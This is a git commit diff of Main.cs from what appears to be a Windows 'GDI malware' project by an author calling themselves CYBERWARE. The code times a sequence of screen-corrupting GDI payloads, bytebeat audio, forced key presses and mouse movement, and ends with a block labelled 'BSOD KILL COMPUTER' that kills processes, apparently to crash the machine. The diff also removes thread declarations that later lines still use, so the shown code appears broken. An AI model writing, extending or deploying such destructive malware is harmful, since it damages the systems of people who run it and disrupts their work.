c4b273a7f12f2da73614224c52b9d8fc0b1d0632
CYBERWARE <t3nx1ltiwzao123@gmail.com>
2024-12-13 22:53:15 -0300

    SOURCE

--- SOURCE CODE/Main.cs
+++ SOURCE CODE/Main.cs
@@ -1,52 +1,22 @@
-﻿using Puspula;
+using Puspula;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Threading;
 using System.Windows.Forms;
-using static Windows.WinApi;
+using static Vanara.PInvoke.User32;
+using Vanara.PInvoke;
+using static Puspula.ThreadManager;
 
 public class mMain
 {
-    private const byte VK_LWIN = 0x5B;
-    private const byte VK_CAPITAL = 0x14;
-    private const byte VK_TAB = 0x09;
+    public static void cls()
+    {
+        InvalidateRect(HWND.NULL, null, true);
+        UpdateWindow(HWND.NULL);
+    }
     public static int Main()
     {
-        var StrangeBox = new Thread(() => Application.Run(new Strange()));
-
-        var winClick = new Thread(() => PayloadSystem.PressKey(VK_LWIN, 0, 0));
-        var capsClick = new Thread(() => PayloadSystem.PressKeySpeed(VK_CAPITAL, 0, 0));
-        var tabClick = new Thread(() => PayloadSystem.PressKeySpeed(VK_TAB, 0, 0));
-
-        var tbb1 = new Thread(ByteBeat.Bytebeat1);
-        var tbb2 = new Thread(ByteBeat.Bytebeat2);
-        var tbb3 = new Thread(ByteBeat.Bytebeat3);
-        var tbb4 = new Thread(ByteBeat.Bytebeat4);
-        var tbb5 = new Thread(ByteBeat.Bytebeat5);
-        var tbb6 = new Thread(ByteBeat.Bytebeat6);
-        var tbb7 = new Thread(ByteBeat.Bytebeat7);
-        var tbb8 = new Thread(ByteBeat.Bytebeat8);
-        var tbb9 = new Thread(ByteBeat.Bytebeat9);
-
-        var gd1 = new Thread(GdiPayload.Carga1);
-        var gd2 = new Thread(GdiPayload.Carga2);
-        var gd3 = new Thread(GdiPayload.Carga3);
-        var gd4 = new Thread(GdiPayload.Carga4);
-        var gd5 = new Thread(GdiPayload.Carga5);
-        var gd6 = new Thread(GdiPayload.Carga6);
-        var gd7 = new Thread(GdiPayload.Carga7);
-        var gd8 = new Thread(GdiPayload.Carga8);
-        var gd9 = new Thread(GdiPayload.Carga9);
-        var gdiEND = new Thread(GdiPayload.END);
- 
-        var gd1Mouse = new Thread(GdiPayload.MouseIcoError);
-        var gd2Mouse = new Thread(GdiPayload.MouseIcoWarn);
-
-        var gdSpawn1 = new Thread(GdiPayload.SpawnIcoWarn);
-
-        var tsp1 = new Thread(PayloadSystem.MoveMouse);
-
         if (Environment.OSVersion.Version.Major != 5 || Environment.OSVersion.Version.Minor != 1)
         {
             System.Windows.Forms.MessageBox.Show(
@@ -82,7 +52,7 @@ MessageBoxButtons.YesNo
         tbb1.Start();
         gd1.Start();
 
-        Thread.Sleep(1000 * 12);
+        Thread.Sleep(1000 * 12);  // 12
 
         tbb1.Abort();
         gd1.Abort();
@@ -91,7 +61,7 @@ MessageBoxButtons.YesNo
         gd2.Start();
         tbb2.Start();
 
-        Thread.Sleep(1000 * 20);
+        Thread.Sleep(1000 * 20);  // 20 
 
         tbb2.Abort();
         gd2.Abort();
@@ -100,7 +70,7 @@ MessageBoxButtons.YesNo
         tbb3.Start();
         gd3.Start();
 
-        Thread.Sleep(1000 * 20);
+        Thread.Sleep(1000 * 20); // 20
 
         tbb3.Abort();
         gd3.Abort();
@@ -108,7 +78,7 @@ MessageBoxButtons.YesNo
 
         tbb4.Start();
         gd4.Start();
-        Thread.Sleep(1000 * 20);
+        Thread.Sleep(1000 * 20);  // 20
 
         tbb4.Abort();
         gd4.Abort();
@@ -118,7 +88,7 @@ MessageBoxButtons.YesNo
         gd5.Start();
         Thread.Sleep(500);
 
-        Thread.Sleep(1000 * 20);
+        Thread.Sleep(1000 * 20);  // 20
 
         tbb5.Abort();
         gd5.Abort();
@@ -128,7 +98,7 @@ MessageBoxButtons.YesNo
         gd6.Start();
         gd1Mouse.Start();
 
-        Thread.Sleep(1000 * 20);
+        Thread.Sleep(1000 * 20);  // 20
 
         tbb6.Abort();
         gd6.Abort();
@@ -142,7 +112,7 @@ MessageBoxButtons.YesNo
         Thread.Sleep(2000);
         gdSpawn1.Start();
 
-        Thread.Sleep(1000 * 20);
+        Thread.Sleep(1000 * 20);  // 20
 
         tbb7.Abort();
         gd7.Abort();
@@ -153,7 +123,7 @@ MessageBoxButtons.YesNo
         tbb8.Start();
         gd8.Start();
 
-        Thread.Sleep(1000 * 20);
+        Thread.Sleep(1000 * 20);  // 20
 
         tbb8.Abort();
         gd8.Abort();
@@ -165,7 +135,7 @@ MessageBoxButtons.YesNo
         capsClick.Start();
         tabClick.Start();
 
-        Thread.Sleep(1000 * 20);
+        Thread.Sleep(1000 * 20);  // 20
 
         tbb9.Abort();
         gd9.Abort();
@@ -178,7 +148,8 @@ MessageBoxButtons.YesNo
         gdiEND.Start();
         Thread.Sleep(1000 * 5);
 
-        /*   BSOD KILL COMPUTER     */
+
+        /*--------  BSOD KILL COMPUTER  --------*/
         Process[] app = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Application.ExecutablePath));
         if (app.Length > 0)
         {
@@ -186,8 +157,8 @@ MessageBoxButtons.YesNo
             {
                 process.Kill();
             }
-        }
-        /*-------------------------*/
+        }  
+        /*-------------------------------------*/
 
         Thread.Sleep(Timeout.Infinite);
         return 0;
